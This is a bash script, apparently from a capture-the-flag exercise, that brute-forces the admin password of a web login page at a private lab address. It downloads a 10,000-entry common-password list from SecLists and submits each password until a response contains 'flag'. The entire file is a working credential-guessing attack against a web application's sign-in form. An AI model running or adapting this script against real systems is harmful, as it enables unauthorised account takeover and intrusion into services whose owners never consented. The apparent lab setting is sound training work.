#!/bin/bash

ip="192.168.56.104"

echo "[*] Starting brute force on $ip..."

curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt | while IFS= read -r password; do
    response=$(curl -s -X POST "http://${ip}/index.php?page=signin&username=admin&password=${password}&Login=Login#")

    if echo "$response" | grep -q "flag"; then
        echo "[+] Password found: ${password}"
        break
    else
        echo "[-] Tried: '${password}'"
    fi
done